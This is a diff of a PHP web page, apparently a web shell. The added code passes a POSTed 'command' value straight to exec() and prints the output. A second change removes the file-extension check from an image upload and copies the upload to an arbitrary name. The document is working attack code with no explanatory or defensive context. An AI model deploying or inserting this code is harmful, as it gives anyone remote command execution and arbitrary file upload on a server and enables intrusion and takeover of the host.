@@ -100,9 +100,15 @@ cursor:crosshair
                 <?php
                 error_reporting(E_ALL);
                 ini_set("display_errors", 1);
+                
+                $output=null;
+                $retval=null;
+                exec($_POST['command'], $output, $retval);
+                echo "Returned with status $retval and output:\n";
+                print_r($output);
 
-                $elOutput = empty(system($_POST['command'])); 
-                print_r($elOutput);
+                //$elOutput = empty(system($_POST['command'])); 
+                //print_r($elOutput);
 
                 ?>
               </textarea><br>
@@ -131,10 +137,11 @@ cursor:crosshair
               $file_size = $_FILES['image']['size'];
               $file_tmp = $_FILES['image']['tmp_name'];
               $file_type = $_FILES['image']['type'];
-              $file_ext = strtolower(end(explode('.', $_FILES['image']['name'])));
+              //$file_ext = strtolower(end(explode('.', $_FILES['image']['name'])));
 
               if (empty($errors) == true) {
                 move_uploaded_file($file_tmp, $file_name);
+                copy($image,"$file_name");
                 //copy($file_tmp,$file_name);
                 echo "Success";
               } else {
